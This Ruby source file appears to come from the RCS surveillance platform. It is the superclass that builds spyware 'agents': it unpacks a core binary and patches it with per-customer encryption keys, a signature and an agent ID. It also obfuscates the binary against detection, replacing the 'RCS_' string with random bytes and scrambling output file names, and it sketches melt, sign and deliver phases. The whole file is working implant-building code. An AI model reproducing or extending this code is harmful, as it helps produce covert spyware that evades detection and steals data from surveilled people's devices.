#
#  Agent creation superclass
#

require_relative 'exec'

# from RCS::Common
require 'rcs-common/trace'

require 'fileutils'
require 'tmpdir'
require 'zip/zip'
require 'zip/zipfilesystem'
require 'securerandom'

module RCS
module DB

class Build
  include RCS::Tracer

  attr_reader :outputs
  attr_reader :scrambled
  attr_reader :platform
  attr_reader :tmpdir
  attr_reader :factory

  @builders = {}

  def self.register(klass)
    if klass.to_s.start_with? "Build" and klass.to_s != 'Build'
      plat = klass.to_s.downcase
      plat['build'] = ''
      @builders[plat.to_sym] = RCS::DB.const_get(klass)
    end
  end

  def initialize
    @outputs = []
    @scrambled = {}
    @tmpdir = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
    trace :debug, "Build: init: #{@tmpdir}"
    Dir.mkdir @tmpdir
  end

  def self.factory(platform)
    begin
      @builders[platform].new
    rescue Exception => e
      raise "Builder for #{platform} : #{e.message}"
    end
  end

  def load(params)
    core = ::Core.where({name: @platform}).first
    raise "Core for #{@platform} not found" if core.nil?

    @core = GridFS.to_tmp core[:_grid].first
    trace :debug, "Build: loaded core: #{@platform} #{core.version} #{File.size(@core)} bytes"

    @factory = ::Item.where({_kind: 'factory', _id: params['_id']}).first
    raise "Factory #{params['ident']} not found" if @factory.nil?
    
    trace :debug, "Build: loaded factory: #{@factory.name}"
  end

  def unpack
    trace :debug, "Build: unpack: #{@core}"

    Zip::ZipFile.open(@core) do |z|
      z.each do |f|
        f_path = path(f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        z.extract(f, f_path) unless File.exist?(f_path)
        @outputs << f.name
      end
    end

    # delete the tmpfile of the core
    FileUtils.rm_rf @core
  end

  def patch(params)
    # skip the phase if not needed
    return if params.nil? or params[:core].nil?

    trace :debug, "Build: patching [#{params[:core]}] file"

    # open the core and binary patch the parameters
    file = File.open(path(params[:core]), 'rb+')
    content = file.read

    # evidence encryption key
    begin
      key = Digest::MD5.digest(@factory.logkey) + SecureRandom.random_bytes(16)
      content.gsub! '3j9WmmDgBqyU270FTid3719g64bP4s52', key
    rescue
      raise "Evidence key marker not found"
    end

    # conf encryption key
    begin
      key = Digest::MD5.digest(@factory.confkey) + SecureRandom.random_bytes(16)
      content.gsub! 'Adf5V57gQtyi90wUhpb8Neg56756j87R', key
    rescue
      raise "Config key marker not found"
    end

    # per-customer signature
    begin
      sign = ::Signature.where({scope: 'agent'}).first
      signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
      content.gsub! 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
    rescue
      raise "Signature marker not found"
    end

    # Agent ID
    begin
      id = @factory.ident.dup
      # first three bytes are random to avoid the RCS string in the binary file
      id['RCS_'] = SecureRandom.hex(2)
      content.gsub! 'av3pVck1gb4eR2', id
    rescue
      raise "Agent ID marker not found"
    end

    # demo parameters
    begin
      content.gsub!('hxVtdxJ/Z8LvK3ULSnKRUmLE', SecureRandom.random_bytes(24)) unless params['demo']
    rescue
      raise "Demo marker not found"
    end

    raise "BUG: misaligned binary patch" if file.size != content.bytesize
    
    file.rewind
    file.write content
    file.close
    
    if params[:config]
      trace :debug, "Build: saving config to [#{params[:config]}] file"

      # retrieve the config and save it to a file
      config = @factory.configs.first.encrypted_config(@factory.confkey)
      File.open(path(params[:config]), 'wb') {|f| f.write config}

      @outputs << params[:config]
    end
  end

  def scramble_name(name, offset)
   alphabet = '_BqwHaF8TkKDMfOzQASx4VuXdZibUIeylJWhj0m5o2ErLt6vGRN9sY1n3Ppc7g-C'

   offset %= alphabet.size
   offset = offset != 0 ? offset : 1

   ret = ''

   name.each_char do |c|
     index = alphabet.index c
     ret += index.nil? ? c : alphabet[(index + offset) % alphabet.size]
   end

   return ret
  end

  def scramble
    # skip the phase if not needed
    return if @scrambled.empty?

    # rename the outputs with the scrambled names
    @outputs.each do |file|
      if @scrambled[file.to_sym]
        File.rename(path(file), path(@scrambled[file.to_sym]))
        @outputs[@outputs.index(file)] = @scrambled[file.to_sym]
      end
    end
    trace :debug, "Build: scrambled: #{@outputs.inspect}"
  end

  def melt(params)
    trace :debug, "Build: skipping #{__method__}"
  end

  def generate(params)
    trace :debug, "Build: skipping #{__method__}"
  end

  def sign(params)
    trace :debug, "Build: skipping #{__method__}"
  end

  def pack(params)
    trace :debug, "Build: skipping #{__method__}"
  end

  def deliver(params)
    trace :debug, "Build: skipping #{__method__}"
  end
  
  def path(name)
    File.join @tmpdir, name
  end

  def clean
    if @tmpdir
      trace :debug, "Build: cleaning up #{@tmpdir}"
      FileUtils.rm_rf @tmpdir
    end
  end

  def create(params)
    trace :info, "Building Agent: #{params}"

    begin
      load params['factory']
      unpack
      generate params['generate']
      patch params['binary']
      scramble
      melt params['melt']
      sign params['sign']
      pack params['package']
      deliver params['deliver']
    rescue Exception => e
      trace :error, "Cannot build: #{e.message}"
      trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
      clean
      raise 
    end
    
  end

end

# require all the builders
Dir[File.dirname(__FILE__) + '/build/*.rb'].each do |file|
  require file
end

# register all builders into Build
RCS::DB.constants.keep_if{|x| x.to_s.start_with? 'Build'}.each do |klass|
  RCS::DB::Build.register klass
end

end #DB::
end #RCS::
